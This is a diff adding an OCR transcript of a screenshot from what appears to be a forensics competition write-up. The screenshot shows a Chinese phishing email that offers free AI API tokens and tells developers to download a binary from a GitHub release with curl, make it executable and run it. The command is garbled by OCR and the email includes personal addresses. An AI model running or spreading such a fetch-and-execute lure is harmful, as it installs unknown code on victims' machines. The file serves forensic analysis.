@@ -1,0 +1,17 @@
+# OCR: QQ_1780902271045.webp
+# 来源: ./02-WriteUp/2026/2026-FIC-初赛/QQ_1780902271045.webp
+# 引擎: Umi-OCR 2.1.5 / PaddleOCR (config_chinese, limit_side_len=2880, multi_para)
+# 生成: 2026-11-03 18:36
+
+ZooM From: To:
+Subject:
+HIGHLIGHT
+"hf13338261292@outlook.com"<hf13338261292@outlook.com>
+lihongan19851024<lihongan19851024@163.com> Token限时免费领
+各位开发者：
+Sent:
+Tue.14Apr202614:08:27+0800
+?
+AI实验室现有API额度供内测用户学习使用。请在Linux终端通过以下链接下载您的专属Key生成工具。该工具下发对应的配置文件至~/.aiconfia。执行下载并获取额度：curl-o
+https://github.com/z583985166/0.0.0/releases/download/1.0.0/get token linux &&& chmod +xget toke
+./get_token_linux剩余名额：23/20o（抢完即止)） beimingyouyu@163.com
